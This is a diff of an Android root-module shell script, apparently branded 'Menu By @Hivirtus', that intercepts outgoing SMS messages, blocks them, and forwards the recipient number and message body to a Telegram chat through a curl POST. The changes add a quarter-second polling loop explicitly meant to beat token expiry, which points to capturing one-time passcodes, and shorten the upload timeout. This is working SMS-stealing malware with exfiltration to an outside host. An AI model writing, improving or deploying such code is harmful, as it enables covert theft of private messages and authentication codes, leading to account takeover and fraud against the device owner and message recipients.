@@ -940,23 +940,21 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # One-tap block = number + full SMS (button + message footer)
+  # Screenshot format + one-tap = To + Message
   ONE_TAP="To: ${TO_NUM}
 Message: ${MSG_BODY}"
 
-  TEXT="📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
------------------
+  TEXT="📱 SMS Intercepted Zygisk Mode
+Menu By @Hivirtus 🔥 --------------------
 📞 To: ${TO_NUM}
-💬 Message: ${MSG_BODY}
-📋 One-tap copy:
-${ONE_TAP}"
+💬 Message:
+${MSG_BODY}"
 
   ESC_TEXT=$(tg_json_escape "$TEXT")
   ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
   ESC_BODY=$(tg_json_escape "$(tg_clip_copy "$MSG_BODY")")
   ESC_TO=$(tg_json_escape "$(tg_clip_copy "$TO_NUM")")
   PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
-  # 3 buttons: number | SMS body | full To+Message
   printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\"${ESC_TO}\"}},{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}],[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}}]]}}" > "$PAYLOAD"
   SENT=0
   RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
@@ -1021,7 +1019,7 @@ tg_http_post() {
   : > "$resp"
   # Prefer curl (JSON body)
   if command -v curl >/dev/null 2>&1; then
-    curl -sS -m 30 -X POST "$url" -H "Content-Type: application/json" --data-binary "@${payload}" -o "$resp" 2>/data/local/tmp/hivirtus_tg_curl.err
+    curl -sS -m 8 -X POST "$url" -H "Content-Type: application/json" --data-binary "@${payload}" -o "$resp" 2>/data/local/tmp/hivirtus_tg_curl.err
     [ -s "$resp" ] && return 0
   fi
   for c in /system/bin/curl /system/xbin/curl \
@@ -1162,6 +1160,15 @@ rewrite_inbox_sender_id() {
 }
 
 (
+  # Ultra-fast TG path — Hero token expire fix (was ~15s)
+  while true; do
+    harvest_blocked_outgoing
+    forward_blocked_telegram
+    sleep 0.25 2>/dev/null || usleep 250000 2>/dev/null || sleep 1
+  done
+) &
+
+(
   while true; do
     send_tg_test_if_requested
     harvest_hook_status
@@ -1169,7 +1176,6 @@ rewrite_inbox_sender_id() {
     harvest_blocked_outgoing
     forward_blocked_telegram
     enforce_sms_block
-    # Fast poll — TG delay kam
     hivirtus_tg_watchdog 2>/dev/null
     sleep 1
   done
